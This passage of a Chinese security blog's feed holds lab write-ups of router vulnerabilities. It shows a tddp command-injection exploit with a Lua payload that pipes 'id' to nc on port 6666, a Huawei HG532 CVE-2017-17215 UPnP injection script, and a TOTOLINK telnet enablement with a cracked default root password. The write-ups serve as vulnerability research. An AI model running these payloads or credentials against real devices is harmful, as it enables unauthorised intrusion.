[sp+A0h] [bp-1Ch]</span><br><span class="line">  int nfds; // [sp+A4h] [bp-18h]</span><br><span class="line">  fd_set *v9; // [sp+A8h] [bp-14h]</span><br><span class="line">  unsigned int i; // [sp+ACh] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  v3 = 1;</span><br><span class="line">  optval = 1;</span><br><span class="line">  printf(&quot;[%s():%d] tddp task start\n&quot;, &quot;tddp_taskEntry&quot;, 151);</span><br><span class="line">  if ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + 9)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[9], 1040)                  // 绑定1040端口</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[11] |= 2u;</span><br><span class="line">    v6[11] |= 4u;</span><br><span class="line">    v6[11] |= 8u;</span><br><span class="line">    v6[11] |= 0x10u;</span><br><span class="line">    v6[11] |= 0x20u;</span><br><span class="line">    v6[11] |= 0x1000u;</span><br><span class="line">    v6[11] |= 0x2000u;</span><br><span class="line">    v6[11] |= 0x4000u;</span><br><span class="line">    v6[11] |= 0x8000u;</span><br><span class="line">    v6[12] = 60;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[13] = sub_9340();                        // 获取时间</span><br><span class="line">    v9 = &amp;readfds;</span><br><span class="line">    for ( i = 0; i &lt;= 0x1F; ++i )</span><br><span class="line">      v9-&gt;__fds_bits[i] = 0;</span><br><span class="line">    nfds = v6[9] + 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = 600;</span><br><span class="line">        timeout.tv_usec = 0;</span><br><span class="line">        readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout);</span><br><span class="line">        if ( sub_9340() - v6[13] &gt; v6[12] )</span><br><span class="line">          v6[8] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 == -1 );</span><br><span class="line">      if ( !v7 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[9]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  return printf(&quot;[%s():%d] tddp task exit\n&quot;, &quot;tddp_taskEntry&quot;, 219);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用socket来实现通讯<br>sub_16D68函数中 绑定了1040端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_16D68(int a1, uint16_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r3</span><br><span class="line">  struct sockaddr s; // [sp+8h] [bp-14h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *&amp;s.sa_data[2] = htonl(0);</span><br><span class="line">  *s.sa_data = htons(a2);</span><br><span class="line">  if ( bind(a1, &amp;s, 0x10u) == -1 )</span><br><span class="line">    v2 = sub_13018(-10103, &quot;failed to bind socket&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯<br>随后会进入sub_16418函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" alt="image.png"></a><br>该函数旨在接收1040端口传输来的数据<br>这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址<br>对于v2进行了一个检测 如果为1则进入分支<br>这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议<br>分为v1和v2两个版本<br>版本号会放在数据包首地址来作为区分<br>随后还会有一个用来表示类型的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>也就是我们在sub_15E74函数中所看到的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" alt="image.png"></a><br>这里借用winmt师傅的图来方便理解包的形式<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" alt="image.png"></a><br>ver为版本号 type则为包的类型<br>本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" alt="image.png"></a><br>其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行<br>那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的<br>上述为第一种漏洞的利用途径 接下来还有一个通过lua脚本达到任意命令执行的洞<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" alt="image.png"></a><br>可以看到 s是由我们所控制的 其作为一个路径的一部分 用来指向一个lua脚本<br>并且如果这个lua脚本存在 就可以执行这个脚本<br>我们再来看一下原本要执行的指令<br>其为 <strong>tftp -gr xxxx host</strong><br>host为宿主机与虚拟机通信的接口ip<br>我们只需要在宿主机启动tftp服务 随后篡改xxxx为正确的文件名 就可以实现任意脚本执行了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持<br>搭建脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line"></span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line"></span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line"></span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line"></span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line"></span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题<br>所以这里按照描述更改映像文件为32G即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</span><br></pre></td></tr></table></figure><p>随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段<br>随后挂载两个文件夹并且设置squashfs-root为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure><p>启动tddp程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" alt="image.png"></a><br>接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的<br>我们需要借助nmap的udp扫描方式<br>可以看到这个端口是有过滤的<br>等下使用脚本复现的时候也要注意一下socket需要调整为UDP<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" alt="image.png"></a><br>随后在宿主机上安装tftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install atftpd</span><br></pre></td></tr></table></figure><p>随后需要进行两次配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/xinetd.d/tftp</span><br><span class="line"></span><br><span class="line">service tftp  </span><br><span class="line">&#123;  </span><br><span class="line">socket_type = dgram  </span><br><span class="line">protocol = udp  </span><br><span class="line">wait = yes  </span><br><span class="line">user = root  </span><br><span class="line">server = /usr/sbin/in.tftpd  </span><br><span class="line">server_args = -s /tftpboot -c   这个文件夹我试过放到用户目录下 最后失败了</span><br><span class="line">disable = no  </span><br><span class="line">per_source = 11  </span><br><span class="line">cps = 100 2  </span><br><span class="line">flags = IPv4  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/atftpd</span><br><span class="line"></span><br><span class="line">USE_INETD=false</span><br><span class="line"># OPTIONS below are used only with init script</span><br><span class="line">OPTIONS=&quot;--tftpd-timeout 0  --retry-timeout 0 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure><p>随后更改tftpboot文件夹的权限以及新增一个payload文件 用来执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /tftpboot</span><br><span class="line">touch payload</span><br><span class="line">sudo vim payload</span><br><span class="line"></span><br><span class="line">function config_test(config)</span><br><span class="line">    os.execute(&quot;id|nc 192.168.6.2 6666&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在虚拟机启动tddp后 使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;|touch a||;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" alt="image.png"></a><br>随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 成功进行了任意的命令执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" alt="image.png"></a><br>接着来尝试第二种方法<br>开启tddp服务以后 执行下列脚本 同时我们需要在宿主机上监听一下6666端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;/payload;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p>使其执行payload文件中的指令<br>随后就可以在6666端口中接收到了id的回显<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" alt="image.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑<br>发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE 2017-17215</title>
    <link href="http://example.com/2023/10/07/cve-2017-17215/"/>
    <id>http://example.com/2023/10/07/cve-2017-17215/</id>
    <published>2023-10-07T12:52:47.000Z</published>
    <updated>2023-10-07T13:20:19.160Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码<br>固件下载地址: <a href="https://archive.org/download/RouterHG532e/router%20HG532e.rar">https://archive.org/download/RouterHG532e/router%20HG532e.rar</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>readelf分析出来是mips32位大端序<br>qemu启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>接着配置系统模拟的eth0接口为192.168.6.xx<br>随后利用scp上传一下提取出来的squashfs-root文件夹<br>接着需要再开一个终端 ssh连接一下<br>这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址<br>挂载一下相关服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev  </span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>开启ssh连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.</span><br></pre></td></tr></table></figure><p>利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现<br>利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_40749C(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // $s1</span><br><span class="line">  const char *v4; // [sp+20h] [-40Ch] BYREF</span><br><span class="line">  const char *v5; // [sp+24h] [-408h] BYREF</span><br><span class="line">  char v6[1028]; // [sp+28h] [-404h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5);</span><br><span class="line">          system(v6);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮  我都没有得到访问该路径的包<br>所以只能直接用网上的exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/u:Upgrade&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/s:Body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data)</span><br></pre></td></tr></table></figure><p>如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" alt="image.png"></a></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中<br>应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤<br>如果可以利用 那么就朔源如何访问到这一函数 随后编写exp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>TOTOLINK-A810R分析</title>
    <link href="http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/</id>
    <published>2023-09-25T02:25:35.000Z</published>
    <updated>2023-09-26T13:39:49.613Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程<br>设备型号:TOTOLINK A810R<br>固件版本: V5.9c.4573_B20191019<br>下载地址: <a href="https://totolink.tw/support_view/A810R">https://totolink.tw/support_view/A810R</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>binwalk提取出文件系统后 老规矩还是来看一下架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" alt="image.png"></a><br>随后就是qemu系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>然后上传文件系统 chroot以及启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/</span><br><span class="line">root/</span><br><span class="line">chroot ./squashfs-root /bin/sh</span><br><span class="line">./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/</span><br></pre></td></tr></table></figure><p>但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器<br>但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先使用firmwalker来看一下文件系统中有什么可以利用的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" alt="image.png"></a><br>可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能<br>访问后直接跳转到了登录界面<br>由于这里我们已经知道了用户密码 所以先登录进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" alt="image.png"></a><br>可以看到就是一个功能简单的 设置是否开启telnet服务的页面<br>这里直接使用burp来看一下按下apply按钮后发送的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 60</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052</span><br><span class="line">Cookie: SESSION_ID=2:1571586185:2</span><br><span class="line"></span><br><span class="line">&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向cstecgi.cgi进行了一个post请求<br>包含了一个json表单 一个有两个参数 telnet_enabled和topicurl<br>前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式<br>因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”<br>同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测<br>我们凭借这个poc就可以做到越权开启telnet服务<br>扫描端口发现开在了23<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" alt="image.png"></a><br>尝试nc连接发现需要账号密码<br>而我们最开始使用firmwalker是扫描到了密码的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" alt="image.png"></a><br>打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:0:0:99999:7:::</span><br></pre></td></tr></table></figure><p>解密后发现是cs2012<br>随后成功连接上路由器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-26258</title>
    <link href="http://example.com/2023/09/23/CVE-2022-26258/"/>
    <id>http://example.com/2023/09/23/CVE-2022-26258/</id>
